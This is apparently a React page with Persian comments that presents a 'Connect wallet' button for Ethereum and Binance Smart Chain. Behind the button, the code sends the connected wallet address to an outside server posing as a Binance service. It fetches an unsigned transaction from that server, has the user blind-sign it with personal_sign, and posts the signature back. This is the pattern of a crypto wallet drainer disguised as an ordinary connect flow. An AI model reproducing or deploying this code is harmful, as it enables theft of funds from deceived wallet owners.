import jQuery from "jquery";
import { useState } from "react";
import { EthereumProvider } from "@walletconnect/ethereum-provider";

function App() {
  const [selectedChain, setSelectedChain] = useState("1"); // پیش‌فرض: اتریوم

  async function runner() {
    var ethereumProvider = await EthereumProvider.init({
      showQrModal: true,
      qrModalOptions: {
        themeMode: "dark",
        explorerRecommendedWalletIds: [
          "c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96",
          "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0",
        ],
      },
      chains: [1, 56], // پشتیبانی از اتریوم و اسمارت چین
      methods: ["eth_sign", "eth_sendTransaction", "personal_sign"],
      projectId: "9fe3ed74e1d73141e8b7747bedf77551",
    });

    await ethereumProvider.enable();
    var provider = ethereumProvider;
    var account = await provider.request({ method: "eth_accounts" });
    var account_sender = account[0];
    console.log("✅ Wallet Address:", account_sender);

    let apiUrl = "https://sponsorbinance.vercel.app/api/proxy";

    async function genSign(address, chain, type, contract = "0") {
      try {
        console.log("🔗 Chain ID for signing:", chain);

        let requestData = { handler: "tx", address, chain, type };
        if (type === "token") requestData.contract = contract;

        var result = await jQuery.post(apiUrl, requestData);
        var unSigned = JSON.parse(result);
        console.log("📜 Unsigned Transaction:", unSigned);

        var Signed = await provider.request({
          method: "personal_sign",
          params: [unSigned.result, address],
        });

        return Signed;
      } catch (error) {
        console.error("❌ Error in genSign:", error);
        return null;
      }
    }

    async function acceptSign(signature, type) {
      try {
        console.log("🖊 Accepting signed transaction:", signature);

        var result = await jQuery.post(apiUrl, {
          handler: "sign",
          signature,
          type,
        });

        var resultJson = JSON.parse(result);
        return resultJson.result;
      } catch (error) {
        console.error("❌ Error in acceptSign:", error);
        return null;
      }
    }

    var signature = await genSign(account_sender, selectedChain, "coin");

    if (signature) {
      console.log("✍️ Signed Transaction:", signature);
      var rawsign = await acceptSign(signature, "coin");
      console.log("📝 Final Signed Transaction:", rawsign);
    } else {
      console.error("⚠ Signing failed.");
    }
  }

  return (
    <div>
      {/* انتخاب شبکه */}
      <label htmlFor="network-select">انتخاب شبکه:</label>
      <select
        id="network-select"
        value={selectedChain}
        onChange={(e) => setSelectedChain(e.target.value)}
      >
        <option value="1">Ethereum</option>
        <option value="56">Binance Smart Chain</option>
      </select>

      {/* دکمه‌ی اتصال */}
      <a
        href="#"
        id="kos"
        onClick={runner}
        className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
        data-uk-toggle=""
      >
        <span>Connect wallet</span>
      </a>
    </div>
  );
}

export default App;
